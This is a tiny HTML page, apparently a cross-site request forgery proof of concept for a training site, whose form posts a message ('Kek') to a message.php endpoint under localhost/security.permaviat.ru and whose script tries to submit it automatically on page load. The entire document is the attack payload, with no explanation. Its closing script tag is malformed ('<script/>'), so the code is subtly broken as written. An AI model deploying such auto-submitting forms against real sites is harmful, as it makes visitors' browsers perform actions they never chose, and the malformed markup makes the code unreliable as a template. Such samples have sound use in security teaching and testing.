<form action="http://localhost/security.permaviat.ru/ajax/message.php" method="POST">
    <br><input type="text" name="IdPost" value="1"/>
    <br>Сообщение:
    <br><input type="text" name="Message" value="Kek"/>
    <br><input type="submit"/>
</form>
<script>
    document.getElementsByTagName("form")[0].submit();
<script/>